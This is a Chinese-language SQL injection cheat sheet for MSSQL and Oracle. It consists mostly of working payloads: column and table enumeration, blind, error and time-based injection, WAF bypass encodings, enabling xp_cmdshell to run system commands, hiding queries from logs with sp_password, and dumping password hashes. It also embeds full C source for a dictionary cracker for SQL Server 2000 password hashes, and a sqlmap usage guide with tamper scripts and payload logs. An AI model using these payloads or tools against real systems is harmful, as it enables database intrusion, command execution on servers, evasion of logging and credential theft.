+SERVERPROPERTY() 函数存在于MSSQL 2005 及以上。
+表和字段
+检测字段数
+ORDER BY n+1;
+
+例子：
+查询语句  SELECT username, password, permission FROM Users WHERE id = '1';
+
+1' ORDER BY 1-- 真 
+1' ORDER BY 2-- 真 
+1' ORDER BY 3-- 真 
+1' ORDER BY 4-- 假- 查询只用了3个字段 
+-1' UNION SELECT 1,2,3-- 真 
+
+注意：
+
+让n一直增加到出现错误页面。
+
+
+下面语句经常用来获取当前查询的字段。
+
+GROUP BY / HAVING
+
+例子：
+查询语句  SELECT username, password, permission FROM Users WHERE id = '1';
+
+1' HAVING 1=1-- 返回下面错误后得到字段username
+Column 'Users.username' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause. 
+1' GROUP BY username HAVING 1=1-- 返回下面错误后得到字段password
+Column 'Users.password' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause. 
+1' GROUP BY username, password HAVING 1=1-- 返回下面错误后得到字段permission
+Column 'Users.permission' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause. 
+1' GROUP BY username, password, permission HAVING 1=1-- 返回正常 
+
+注意：
+
+当所有字段都包含之后便返回正常。
+查询表名
+我们可以从两个不同的库中获取表 information_schema.tables 和 master..sysobjects.
+
+Union方式
+
+UNION SELECT name FROM master..sysobjects WHERE xtype='U' 
+
+
+盲注
+AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
+
+
+报错方式
+AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables) 
+AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables)) 
+ 
+
+
+
+注意：
+
+
+Xtype = 'U' 是查询用户定义的表，也可以使用'V'查询视图。
+查询列名
+
+
+我们可以从两个不同的库中获取列 information_schema.tables 和 master..sysobjects.
+
+
+
+Union方式
+
+UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename') 
+
+
+盲注
+AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns > 'A'
+
+
+报错方式
+AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns) 
+AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns)) 
+
+
+
+
+
+一次查询多个表或列
+下面三个语句将会创建一个临时table与column，插入所有用户定义的表，dump内容后删除。
+
+创建临时Table与Column插入数据：
+AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;
+Dump内容：
+AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);
+删除表
+AND 1=0; DROP TABLE TMP_DB;
+注意：
+
+可以编码语句绕过某些限制：
+' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--
+绕过引号限制
+SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110) 
+
+绕过字符串黑名单
+SELECT CONCAT('a','a','a'); (SQL SERVER 2012) 
+SELECT 'a'+'d'+'mi'+'n'; 
+
+条件语句
+IF 
+CASE 
+
+例子：
+IF 1=1 SELECT 'true' ELSE SELECT 'false';
+SELECT CASE WHEN 1=1 THEN true ELSE false END;
+注意：
+
+在用SELECT查询时不可以使用IF。
+时间延迟查询
+WAITFOR DELAY 'H:M:S';
+
+例子：
+IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
+OPENROWSET 攻击
+SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"'); 
+
+系统命令执行
+扩展存储过程xp_cmdshell可以用来执行系统命令。
+
+EXEC master.dbo.xp_cmdshell 'cmd';
+MSSQL 2005之前 xp_cmdshell默认是禁用的，但可以用下面的语句激活：
+
+EXEC sp_configure 'show advanced options', 1 
+EXEC sp_configure reconfigure 
+EXEC sp_configure 'xp_cmdshell', 1 
+EXEC sp_configure reconfigure 
+
+
+另外，也可以创建自己的程序来达到同样的结果：
+
+DECLARE @execmd INT 
+EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT 
+EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c' 
+
+
+如果SQL版本高于2000，需要额外执行下面的语句来执行命令：
+
+EXEC sp_configure 'show advanced options', 1 
+EXEC sp_configure reconfigure 
+EXEC sp_configure 'OLE Automation Procedures', 1 
+EXEC sp_configure reconfigure 
+
+例子：
+查看xp_cmdshell是否已经加载，检测到被加载了会执行'dir' 命令然后把结果插入TMP_DB中：
+' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'<br></font><font color="black">'%2Bdir,'<dir>','</font><font color="orange">') FROM %23Data WHERE dir>@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--
+Dump内容：
+' UNION SELECT tbl FROM TMP_DB--
+删除表：
+' DROP TABLE TMP_DB--
+SP_PASSWORD (隐藏查询)
+把sp_password放在查询最后可以隐藏SQL日志。
+
+SP_PASSWORD
+
+例子：
+' AND 1=1--sp_password
+
+输出：
+-- 'sp_password' was found in the text of this event.
+-- 以上为加上sp_password后的日志记录。
+                                        
+堆查询
+MSSQL 默认支持堆查询。
+
+例子：
+' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');
+模糊与混淆
+允许的字符
+下面的字符可以用来做间隔：
+
+01 Start of Heading 
+02 Start of Text 
+03 End of Text 
+04 End of Transmission 
+05 Enquiry 
+06 Acknowledge 
+07 Bell 
+08 Backspace 
+09 Horizontal Tab 
+0A New Line 
+0B Vertical Tab 
+0C New Page 
+0D Carriage Return 
+0E Shift Out 
+0F Shift In 
+10 Data Link Escape 
+11 Device Control 1 
+12 Device Control 2 
+13 Device Control 3 
+14 Device Control 4 
+15 Negative Acknowledge 
+16 Synchronous Idle 
+17 End of Transmission Block 
+18 Cancel 
+19 End of Medium 
+1A Substitute 
+1B Escape 
+1C File Separator 
+1D Group Separator 
+1E Record Separator 
+1F Unit Separator 
+20 Space 
+25 % 
+
+例子：
+S%E%L%E%C%T%01column%02FROM%03table;
+A%%ND 1=%%%%%%%%1;
+注意：
+
+百分号只能在ASP(x)的web应用上使用。
+
+
+下面的字符也可以用来绕过过滤空格的情况：
+
+22 " 
+28 ( 
+29 ) 
+5B [ 
+5D ] 
+
+例子：
+UNION(SELECT(column)FROM(table));
+SELECT"table_name"FROM[information_schema].[tables];
+AND或OR后面可以跟的字符：
+01 - 20 Range 
+21 ! 
+2B + 
+2D - 
+2E . 
+5C \ 
+7E ~ 
+
+例子：
+SELECT 1FROM[table]WHERE\1=\1AND\1=\1;
+注意：
+
+反斜线在MSSQL 2000不能用。
+编码
+编码你的注入语句可能绕过某些WAF或者IDS。
+
+URL编码 SELECT %74able_%6eame FROM information_schema.tables; 
+URL二次编码 SELECT %2574able_%256eame FROM information_schema.tables; 
+Unicode编码 SELECT %u0074able_%u6eame FROM information_schema.tables; 
+无效的Hex 编码 (ASP) SELECT %tab%le_%na%me FROM information_schema.tables; 
+Hex 编码 ' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);-- 
+HTML Entities (待确认的方式) %26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B 
+
+Password Hashing
+Passwords begin with 0x0100, the first for bytes following the 0x are a constant; the next eight bytes are the hash salt and the remaining 80 bytes are two hashes, the first 40 bytes are a case-sensitive hash of the password, while the second 40 bytes are the uppercase version.
+
+0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457 
+
+Password Cracker
+This tool is designed to crack Microsoft SQL Server 2000 passwords.
+
+///////////////////////////////////////////////////////////////////////////////// // // SQLCrackCl // // This will perform a dictionary attack against the // upper-cased hash for a password. Once this // has been discovered try all case variant to work // out the case sensitive password. // // This code was written by David Litchfield to // demonstrate how Microsoft SQL Server 2000 // passwords can be attacked. This can be // optimized considerably by not using the CryptoAPI. // // (Compile with VC++ and link with advapi32.lib // Ensure the Platform SDK has been installed, too!) // ////////////////////////////////////////////////////////////////////////////////// #include #include #include FILE *fd=NULL; char *lerr = "\nLength Error!\n"; int wd=0; int OpenPasswordFile(char *pwdfile); int CrackPassword(char *hash); int main(int argc, char *argv[]) { int err = 0; if(argc !=3) { printf("\n\n*** SQLCrack *** \n\n"); printf("C:\\>%s hash passwd-file\n\n",argv[0]); printf("David Litchfield (david@ngssoftware.com)\n"); printf("24th June 2002\n"); return 0; } err = OpenPasswordFile(argv[2]); if(err !=0) { return printf("\nThere was an error opening the password file %s\n",argv[2]); } err = CrackPassword(argv[1]); fclose(fd); printf("\n\n%d",wd); return 0; } int OpenPasswordFile(char *pwdfile) { fd = fopen(pwdfile,"r"); if(fd) return 0; else return 1; } int CrackPassword(char *hash) { char phash[100]=""; char pheader[8]=""; char pkey[12]=""; char pnorm[44]=""; char pucase[44]=""; char pucfirst[8]=""; char wttf[44]=""; char uwttf[100]=""; char *wp=NULL; char *ptr=NULL; int cnt = 0; int count = 0; unsigned int key=0; unsigned int t=0; unsigned int address = 0; unsigned char cmp=0; unsigned char x=0; HCRYPTPROV hProv=0; HCRYPTHASH hHash; DWORD hl=100; unsigned char szhash[100]=""; int len=0; if(strlen(hash) !=94) { return printf("\nThe password hash is too short!\n"); } if(hash[0]==0x30 && (hash[1]== 'x' || hash[1] == 'X')) { hash = hash + 2; strncpy(pheader,hash,4); printf("\nHeader\t\t: %s",pheader); if(strlen(pheader)!=4) return printf("%s",lerr); hash = hash + 4; strncpy(pkey,hash,8); printf("\nRand key\t: %s",pkey); if(strlen(pkey)!=8) return printf("%s",lerr); hash = hash + 8; strncpy(pnorm,hash,40); printf("\nNormal\t\t: %s",pnorm); if(strlen(pnorm)!=40) return printf("%s",lerr); hash = hash + 40; strncpy(pucase,hash,40); printf("\nUpper Case\t: %s",pucase); if(strlen(pucase)!=40) return printf("%s",lerr); strncpy(pucfirst,pucase,2); sscanf(pucfirst,"%x",&cmp); } else { return printf("The password hash has an invalid format!\n"); } printf("\n\n Trying...\n"); if(!CryptAcquireContextW(&hProv, NULL , NULL , PROV_RSA_FULL ,0)) { if(GetLastError()==NTE_BAD_KEYSET) { // KeySet does not exist. So create a new keyset if(!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET )) { printf("FAILLLLLLL!!!"); return FALSE; } } } while(1) { // get a word to try from the file ZeroMemory(wttf,44); if(!fgets(wttf,40,fd)) return printf("\nEnd of password file. Didn't find the password.\n"); wd++; len = strlen(wttf); wttf[len-1]=0x00; ZeroMemory(uwttf,84); // Convert the word to UNICODE while(count < len) { uwttf[cnt]=wttf[count]; cnt++; uwttf[cnt]=0x00; count++; cnt++; } len --; wp = &uwttf; sscanf(pkey,"%x",&key); cnt = cnt - 2; // Append the random stuff to the end of // the uppercase unicode password t = key >> 24; x = (unsigned char) t; uwttf[cnt]=x; cnt++; t = key << 8; t = t >> 24; x = (unsigned char) t; uwttf[cnt]=x; cnt++; t = key << 16; t = t >> 24; x = (unsigned char) t; uwttf[cnt]=x; cnt++; t = key << 24; t = t >> 24; x = (unsigned char) t; uwttf[cnt]=x; cnt++; // Create the hash if(!CryptCreateHash(hProv, CALG_SHA, 0 , 0, &hHash)) { printf("Error %x during CryptCreatHash!\n", GetLastError()); return 0; } if(!CryptHashData(hHash, (BYTE *)uwttf, len*2+4, 0)) { printf("Error %x during CryptHashData!\n", GetLastError()); return FALSE; } CryptGetHashParam(hHash,HP_HASHVAL,(byte*)szhash,&hl,0); // Test the first byte only. Much quicker. if(szhash[0] == cmp) { // If first byte matches try the rest ptr = pucase; cnt = 1; while(cnt < 20) { ptr = ptr + 2; strncpy(pucfirst,ptr,2); sscanf(pucfirst,"%x",&cmp); if(szhash[cnt]==cmp) cnt ++; else { break; } } if(cnt == 20) { // We've found the password printf("\nA MATCH!!! Password is %s\n",wttf); return 0; } } count = 0; cnt=0; } return 0; } Oracle
+默认数据库
+SYSTEM 所有版本都存在 
+SYSAUX 所有版本都存在 
+
+注释
+下面的符号可以用来注释语句：
+
+-- SQL 语法 
+
+例子：
+SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
+测试版本号
+SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; 
+SELECT banner FROM v$version WHERE banner LIKE 'TNS%'; 
+SELECT version FROM v$instance; 
+
+注意：
+
+Oracle中的select查询必须包含一个表。
+dual是一个虚拟表，可以用来做测试。
+数据库认证信息
+SELECT username FROM all_users; 所有版本中都存在 
+SELECT name, password from sys.user$; Privileged, <= 10g 
+SELECT name, spare4 from sys.user$; Privileged, <= 11g 
+
+数据库名
+当前数据库
+SELECT name FROM v$database; 
+SELECT instance_name FROM v$instance 
+SELECT global_name FROM global_name 
+SELECT SYS.DATABASE_NAME FROM DUAL 
+
+用户数据库
+SELECT DISTINCT owner FROM all_tables; 
+
+服务器主机名
+SELECT host_name FROM v$instance; (Privileged) 
+SELECT UTL_INADDR.get_host_name FROM dual; 
+SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; 
+SELECT UTL_INADDR.get_host_address FROM dual; 
+
+表和字段
+检测表
+SELECT table_name FROM all_tables; 
+
+检测字段
+SELECT column_name FROM all_tab_columns; 
+
+根据字段查询表
+SELECT column_name FROM all_tab_columns WHERE table_name = 'Users'; 
+
+根据表查询字段
+SELECT table_name FROM all_tab_tables WHERE column_name = 'password'; 
+
+一次查询多个表
+SELECT RTRIM(XMLAGG(XMLELEMENT(e, table_name || ',')).EXTRACT('//text()').EXTRACT('//text()') ,',') FROM all_tables; 
+
+绕过引号限制
+不同于其他的RDBMS，Oracle允许表和字段编码。
+
+SELECT 0x09120911091 FROM dual; Hex 编码 
+SELECT CHR(32)||CHR(92)||CHR(93) FROM dual; CHR()函数 
+
+绕过字符串黑名单
+SELECT 'a'||'d'||'mi'||'n' FROM dual; 
+
+条件语句
+SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END FROM dual 
+
+时间延迟查询
+时间延迟
+SELECT UTL_INADDR.get_host_address('non-existant-domain.com') FROM dual; 
+
+Heavy Time Delays
+AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) > 0 AND 300 > ASCII(SUBSTR((SELECT username FROM all_users WHERE rownum = 1),1,1)); 
+
+Privileges
+SELECT privilege FROM session_privs; 
+SELECT grantee, granted_role FROM dba_role_privs; (Privileged) 
+
+Out Of Band Channeling
+DNS Requests
+SELECT UTL_HTTP.REQUEST('http://localhost') FROM dual; 
+SELECT UTL_INADDR.get_host_address('localhost.com') FROM dual; 
+
+
+
+=========================================================================================================
+sqlmap的使用
+sqlmap支持五种不同的注入模式：
+1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+4、联合查询注入，可以使用union的情况下的注入。
+5、堆查询注入，可以同时执行多条语句的执行时的注入。
+
+
+可以用svn来获取sqlmap
+svn checkout https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap-dev
+之后可以直接使用命令来更新
+python sqlmap.py --update
+
+
+--data  提交的post数据
+--cookie 设置cookie
+--user-agent 设置UA；--random-agent 随机的设置UA
+--referer 设置refer
+
+
+也可以针对伪静态注入：
+*表示插入注入语句的地方
+python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"
+
+
+--dbms 设定注入的数据库 支持Mysql，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，SQLite，Firebird，Sybase，SAP MaxDB
+
+
+--os 设定操作系统 Linux，Windows
+
+
+--prefix和--suffix  设定注入时的前后缀，例如：
+数据库语句是这样写的：
+$query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";
+sqlmap命令可以写成如下：
+python sqlmap.py -u "http://targeturl/list.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
+针对id参数注入，并且前面加上')   后面加上AND ('abc'=abc
+数据库的语句会变成：
+$query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1";
+
+
+sqlmap默认的注入不会对字符做编码等其他绕过方式的尝试，但可以手动调用tamper目录下带的一些脚本工具对注入语句做不同的编码来绕过某些限制。
+python sqlmap.py -u "http://targeturl/list.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
+[hh:mm:03] [DEBUG] cleaning up configuration parameters
+[hh:mm:03] [INFO] loading tamper script 'between'
+[hh:mm:03] [INFO] loading tamper script 'randomcase'
+[hh:mm:03] [INFO] loading tamper script 'space2comment'
+[...]
+[hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092
+[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057
+[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041
+[...]
+[hh:mm:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
+[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(58,117,113,107,58),SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/
+ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/group/**/bY/**/x)a)
+[hh:mm:04] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable
+[...]
+
+
+--level 共有5个level，level越高尝试的不同字符串攻击越多
+--risk 共有4个risk，作用同上，每个level与risk对应的攻击尝试可以在xml/payloads.xml里看到。
+--string 页面返回正常时所独有的字符串（关键字）
+--regexp 页面返回正常时正则表匹配的字符串
+--text-only 只匹配文本内容，<script>等标签内的内容不做匹配
+
+
+--technique 采取哪种注入方式
+B: Boolean-based blind SQL injection（布尔型注入）
+E: Error-based SQL injection（报错型注入）
+U: UNION query SQL injection（可联合查询注入）
+S: Stacked queries SQL injection（可多语句查询注入）
+T: Time-based blind SQL injection（基于时间延迟注入）
+
+
+--current-user 当前数据库用户
+--current-db 当前数据库名
+--users 列出数据库所有用户
+
+
+列出testdb数据库中的表
+python sqlmap.py -u "http://targeturl/list.php?id=1" --tables -D testdb
